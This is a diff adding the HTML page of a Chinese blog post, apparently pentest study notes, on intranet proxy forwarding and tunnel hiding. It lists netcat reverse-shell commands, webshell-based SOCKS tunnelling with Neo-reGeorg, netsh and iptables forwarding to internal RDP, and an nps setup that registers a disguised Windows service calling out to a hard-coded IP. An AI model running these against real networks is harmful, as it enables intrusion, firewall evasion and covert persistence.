@@ -1,0 +1,782 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CoutCin">
+  <meta name="keywords" content="网络安全,内网安全,技术宅">
+  
+    <meta name="description" content="内网代理转发和隧道隐藏技术相关方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透-内网代理转发与隧道隐藏">
+<meta property="og:url" content="https://coutcin-xw.github.io/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/index.html">
+<meta property="og:site_name" content="CoutCin&#39;s Blog">
+<meta property="og:description" content="内网代理转发和隧道隐藏技术相关方法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://coutcin-xw.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291888961-bf8c2cba-0e8b-49ea-a842-7e3645b27e8b.png">
+<meta property="og:image" content="https://coutcin-xw.github.io/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291888961-bf8c2cba-0e8b-49ea-a842-7e3645b27e8b.png">
+<meta property="og:image" content="https://coutcin-xw.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291909331-8d34af6a-1db9-4cee-b8ca-dbc10311d926.png">
+<meta property="og:image" content="https://coutcin-xw.github.io/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291909331-8d34af6a-1db9-4cee-b8ca-dbc10311d926.png">
+<meta property="article:published_time" content="2022-05-01T06:43:16.000Z">
+<meta property="article:modified_time" content="2022-08-30T07:45:47.170Z">
+<meta property="article:author" content="CoutCin">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="内网代理转发">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://coutcin-xw.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291888961-bf8c2cba-0e8b-49ea-a842-7e3645b27e8b.png">
+  
+  
+  
+  <title>内网渗透-内网代理转发与隧道隐藏 - CoutCin&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"coutcin-xw.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"gtag":null,"woyaola":null,"cnzz":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>CoutCin&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内网渗透-内网代理转发与隧道隐藏"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-05-01 14:43" pubdate>
+          2022年5月1日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内网渗透-内网代理转发与隧道隐藏</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>当你内网横向中,内网代理转发和隧道隐藏技术非常重要. 当拿下内网一台主机的控制权后，需要通过代理转发的方式进入内网.当目标有防火墙时,隧道隐藏技术可以帮助我们达到绕过防火墙的目的.</p>
+<h1 id="0x01-正反向代理和正反向shell"><a href="#0x01-正反向代理和正反向shell" class="headerlink" title="0x01 正反向代理和正反向shell"></a>0x01 正反向代理和正反向shell</h1><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>构造代理服务器，用户将请求发送到代理服务器，代理服务器将请求发送到服务器，服务器将信息发送到代理服务器，代理服务器再将信息发送到用户。</p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291888961-bf8c2cba-0e8b-49ea-a842-7e3645b27e8b.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<img src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291888961-bf8c2cba-0e8b-49ea-a842-7e3645b27e8b.png" srcset="/img/loading.gif" lazyload class="" title="正向代理">
+
+<h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>用户将请求发送到反向代理服务器，反向代理服务器将请求发送到服务器，服务器将信息发送到反向代理服务器，返现代理服务器将信息发送用户，常见应用场景为企业网访问互联网。</p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291909331-8d34af6a-1db9-4cee-b8ca-dbc10311d926.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291909331-8d34af6a-1db9-4cee-b8ca-dbc10311d926.png" srcset="/img/loading.gif" lazyload class="" title="反向代理">
+
+<h2 id="正向-反向shell"><a href="#正向-反向shell" class="headerlink" title="正向&amp;反向shell"></a>正向&amp;反向shell</h2><p>客户端链接服务器：</p>
+<p>服务器 nc -lvnp 444</p>
+<p>客户端 nc 服务器ip 444</p>
+<ul>
+<li><p>如果服务器想获取客户端的shell 反向shell</p>
+<ul>
+<li>服务器：<code>nc -lvp 4444</code></li>
+<li>客户端：<code>nc 服务端ip 4444 -e /bin/bash </code></li>
+</ul>
+</li>
+<li><p>如果客户端想获取服务器的shell 正向shell</p>
+<ul>
+<li>服务器：<code>nc -lvp 4444 -e /bin/bash</code></li>
+<li>客户端：<code>nc 服务器ip 4444</code></li>
+</ul>
+</li>
+</ul>
+<h1 id="0x02-socks协议"><a href="#0x02-socks协议" class="headerlink" title="0x02 socks协议"></a>0x02 socks协议</h1><p>SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。Socks介于传输层与表示层之间，使用TCP协议传输。</p>
+<h2 id="常用socks代理工具"><a href="#常用socks代理工具" class="headerlink" title="常用socks代理工具"></a>常用socks代理工具</h2><ul>
+<li>EarthWorm</li>
+<li>regGeorg</li>
+<li>sSocks</li>
+<li>SocksCap64</li>
+<li>Proxifier</li>
+<li>ProxyChains</li>
+</ul>
+<h1 id="0x03-隧道相关"><a href="#0x03-隧道相关" class="headerlink" title="0x03 隧道相关"></a>0x03 隧道相关</h1><p>隧道技术是一种通过使用互联网络的基本设施在网络之间传递数据的方式，使用隧道传递的数据（或负载）可以是<strong>不同协议的数据帧或包</strong>。隧道技术将其他协议的数据帧或者数据包重新封装然后通过<strong>隧道</strong>发送。新的帧头提供路由信息，以便互联网传递被封装的负载数据。</p>
+<h2 id="隐藏通信隧道概述"><a href="#隐藏通信隧道概述" class="headerlink" title="隐藏通信隧道概述"></a>隐藏通信隧道概述</h2><p>一般的网络通信，先在两台机器之间建立tcp连接，然后进行正常的数据通信。在指定ip地址的情况下，可以直接发送报文；如果不知道ip地址，就需要将域名解析成ip地址。在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙</p>
+<p>常用的隧道列举如下。</p>
+<p>网络层：Ipv6情况、icmp情况、Gre隧道0</p>
+<p>传输层： Tcp 隧道、udp 隧道 常规端口转发 ·</p>
+<p>应用层： ssh隧道、http隧道、https隧道、dns隧道</p>
+<p>具体的利用以后用到再详细写</p>
+<h1 id="0x04-内网代理转发常用方法和工具"><a href="#0x04-内网代理转发常用方法和工具" class="headerlink" title="0x04 内网代理转发常用方法和工具"></a>0x04 内网代理转发常用方法和工具</h1><h2 id="msf-建立路由开启socks代理"><a href="#msf-建立路由开启socks代理" class="headerlink" title="msf 建立路由开启socks代理"></a>msf 建立路由开启socks代理</h2><p>当服务器通外网时,我们获得了一个msf的session 可以通过msf自带的 autoroute 来建立一个基于session的路由,当建立以后.msf内的工具可以直接与内网通信.如果要其他工具也使用的话 msf建立一个socks代理服务即可</p>
+<h2 id="Neo-reGeorg-端口复用"><a href="#Neo-reGeorg-端口复用" class="headerlink" title="Neo-reGeorg 端口复用"></a>Neo-reGeorg 端口复用</h2><p>配合Webshell，复用目标的Web服务端口开一个Socks5代理隧道。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 neoreg.py generate -k password					<span class="hljs-comment">#生成服务端</span><br>python3 neoreg.py -k password -u http://xx/tunnel.php	<span class="hljs-comment">#在本地建立Socks5代理</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Windows-netsh-端口转发（双网卡用）"><a href="#Windows-netsh-端口转发（双网卡用）" class="headerlink" title="Windows netsh 端口转发（双网卡用）"></a>Windows netsh 端口转发（双网卡用）</h2><p><code>netsh</code>仅支持TCP协议， 适用于<strong>双网卡</strong>服务器</p>
+<p>连接外网6666端口，就是连接到内网目标上面的3389。</p>
+<p><strong>启动转发</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看现有规则</span><br>netsh interface portproxy show all<br><br><span class="hljs-comment">#添加转发规则</span><br>netsh interface portproxy <span class="hljs-built_in">set</span> v4tov4 listenaddress=外网IP listenport=6666 connectaddress=内网IP connectport=3389<br></code></pre></td></tr></table></figure>
+
+<p><strong>取消转发</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#删除转发规则</span><br>netsh interface portproxy delete v4tov4 listenport=6666<br><br><span class="hljs-comment">#xp需要安装ipv6</span><br>netsh interface ipv6 install<br></code></pre></td></tr></table></figure>
+
+<h2 id="Linux-iptables-端口转发（高权限用）"><a href="#Linux-iptables-端口转发（高权限用）" class="headerlink" title="Linux iptables 端口转发（高权限用）"></a>Linux iptables 端口转发（高权限用）</h2><p>1、编辑配置文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/sysctl.conf<br>	net.ipv4.ip_forward = 1#开启IP转发<br></code></pre></td></tr></table></figure>
+
+<p>2、关闭服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service iptables stop<br></code></pre></td></tr></table></figure>
+
+<p>3、配置规则</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#需要访问的内网地址：10.1.1.11（Windows）</span><br><span class="hljs-comment">#内网边界web服务器：192.168.100.100（Linux）</span><br>iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389<br><br>iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100<br></code></pre></td></tr></table></figure>
+
+<p>4、保存并重启服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service iptables save &amp;&amp; service iptables start<br></code></pre></td></tr></table></figure>
+
+<p>这时访问Web服务器的3389就能登录到内网机器的桌面了。</p>
+<h2 id="nps反向代理"><a href="#nps反向代理" class="headerlink" title="nps反向代理"></a>nps反向代理</h2><p>1、下载nps服务端到自己的VPS（以Linux-Centos为例）<a target="_blank" rel="noopener" href="https://ehang-io.github.io/nps">https://ehang-io.github.io/nps</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ./nps install	<span class="hljs-comment">#安装</span><br><span class="hljs-built_in">sudo</span> nps start		<span class="hljs-comment">#启动</span><br><span class="hljs-built_in">sudo</span> nps stop		<span class="hljs-comment">#停止</span><br><span class="hljs-built_in">sudo</span> nps reload		<span class="hljs-comment">#服务端配置文件重载</span><br></code></pre></td></tr></table></figure>
+
+<p>2、修改配置文件（敏感信息改掉） <code>/etc/nps/conf/nps.conf</code></p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>web_port</td>
+<td>web管理端口</td>
+</tr>
+<tr>
+<td>web_password</td>
+<td>web界面管理密码</td>
+</tr>
+<tr>
+<td>web_username</td>
+<td>web界面管理账号</td>
+</tr>
+<tr>
+<td>auth_key</td>
+<td>web api密钥</td>
+</tr>
+<tr>
+<td>public_vkey</td>
+<td>客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式</td>
+</tr>
+<tr>
+<td>auth_crypt_key</td>
+<td>获取服务端authKey时的aes加密密钥，16位</td>
+</tr>
+</tbody></table>
+<p><strong>创建系统服务</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc create svnservice binpath= <span class="hljs-string">&quot;C:\Users\Public\Videos\setup.exe -server=111.173.114.77:8091 -vkey=zkxcn35bhkzit2kt -type=tcp&quot;</span>  displayname= <span class="hljs-string">&quot;SVNService&quot;</span> depend= Tcpip start= auto<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc start svnservice<br></code></pre></td></tr></table></figure>
+
+<h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>未完待续…</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%AC%94%E8%AE%B0/" class="print-no-link">#笔记</a>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/" class="print-no-link">#内网代理转发</a>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网渗透-内网代理转发与隧道隐藏</div>
+      <div>https://coutcin-xw.github.io/2022/05/01/内网渗透-内网代理转发与隧道隐藏/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>CoutCin</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年5月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" title="内网渗透-内网基础知识">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内网渗透-内网基础知识</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F/" title="内网渗透-域渗透">
+                        <span class="hidden-mobile">内网渗透-域渗透</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
